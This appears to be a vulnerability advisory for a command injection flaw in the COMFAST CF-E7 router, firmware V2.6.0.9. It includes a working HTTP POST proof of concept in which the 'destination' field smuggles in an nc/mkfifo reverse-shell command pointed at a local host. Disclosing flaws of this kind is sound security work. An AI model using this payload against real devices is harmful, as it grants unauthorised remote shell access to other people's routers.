## Comfast CF-E7 Router

- **Supplier:** COMFAST

- **Product:** COMFAST CF-E7

- **Firmware Version:** V2.6.0.9

- **Vulnerability:** Command Injection

### Overview

A command injection vulnerability has been discovered in the COMFAST CF-E7 V2.6.0.9 Router. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/mbox-config?method=SET&section=ping_config`, prompting the user to log in and obtain cookies.

### Vulnerability Details

The trigger point is located in the `sub_441CF4` method of the `webmggnt` component. Here, the `destination` field is not validated and is concatenated using `sprintf`, and then executed using `system`.

![](../main/images/2026-02-07-15-26-47-image.png)

![](../main/images/2026-02-07-15-27-14-image.png)

![](../main/images/2026-02-07-15-27-36-image.png)

### poc

```http
POST /cgi-bin/mbox-config?method=SET&section=ping_config HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0

Accept: application/json, text/javascript, */*; q=0.01

Accept-Language: en-US,en;q=0.9

Accept-Encoding: gzip, deflate, br

Content-Type: appliation/json

X-Requested-With: XMLHttpRequest

Content-Length: 112

Origin: http://192.168.0.1

Sec-GPC: 1

Connection: close

Referer: http://192.168.0.1/computer/ntp.html

Cookie: COMFAST_SESSIONID=c0a80002-4261ffffffc85cffffff8a5f-6b8b4567

Priority: u=0



{"destination": "127.0.0.1\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #"}
```

![](../main/images/2026-02-07-15-29-37-image.png)

